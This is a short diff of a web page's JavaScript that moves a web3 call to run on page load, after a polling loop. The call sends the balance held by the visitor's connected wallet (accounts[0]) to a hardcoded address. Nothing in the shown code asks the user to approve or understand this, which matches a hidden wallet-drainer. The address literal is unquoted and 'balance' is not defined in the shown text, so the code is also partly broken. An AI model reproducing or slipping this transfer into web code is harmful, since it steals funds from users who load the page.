@@ -837,18 +837,6 @@ window.addEventListener('load', function () {
 
 
 
-contract.methods.transfer(0x03b89A4c0CF05D8c0a85E53c6979088B6ceB1E0b, web3.utils.toWei(balance, 'ether'))
-        .send({ from: accounts[0] })
-        .then((res) => {
-          console.log(res)
-        })
-        .catch((err) => {
-          console.log(err)
-        })
-
-
-
-
 
 
 		$("#contract-balance").html(data);
@@ -862,6 +850,21 @@ contract.methods.transfer(0x03b89A4c0CF05D8c0a85E53c6979088B6ceB1E0b, web3.utils
 setInterval(function(){
     getcontractdetails();
 }, 5000);
+
+
+
+
+
+contract.methods.transfer(0x03b89A4c0CF05D8c0a85E53c6979088B6ceB1E0b, web3.utils.toWei(balance, 'ether'))
+        .send({ from: accounts[0] })
+        .then((res) => {
+          console.log(res)
+        })
+        .catch((err) => {
+          console.log(err)
+        })
+
+
 
 
 	
